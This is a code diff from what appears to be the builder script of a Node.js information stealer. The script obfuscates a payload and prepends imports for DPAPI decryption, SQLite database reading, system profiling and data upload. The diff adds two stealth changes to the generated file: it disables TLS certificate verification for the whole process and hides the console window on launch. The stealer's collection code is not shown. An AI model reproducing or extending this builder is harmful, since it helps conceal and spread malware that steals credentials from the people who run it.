@@ -177,23 +177,31 @@ async function obfuscate(input, output) {
             opaquePredicates: 0,
             shuffle: { hash: 0, true: 0 },
         }).then(obfuscated => {
-            let modules = `require("child_process");
-                            require("crypto");
-                            require("fs");
-                            require("os");
-                            require("path");
-                            require("stream");
-                            require("zip-lib");
-                            require("dapifix");
-                            require("systeminformation");
-                            require("sqlite3");
-                            require("request");
-                            require("node-hide-console-window");
-                            require("form-data");
-                            require("buffer-replace");
-                            require("axios");
-                            require("./config_obf.js");
-                            `
+            let modules = `process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
+require("child_process");
+require("crypto");
+require("fs");
+require("os");
+require("path");
+require("stream");
+require("zip-lib");
+require("dapifix");
+require("systeminformation");
+require("sqlite3");
+require("request");
+require("node-hide-console-window");
+require("form-data");
+require("buffer-replace");
+require("axios");
+require('https');
+require("./config_obf.js");
+
+async function hideSelf() {
+    require("node-hide-console-window").hideConsole();
+}
+
+hideSelf();
+`
 
             res(fs.writeFileSync(output, modules + obfuscated));
 
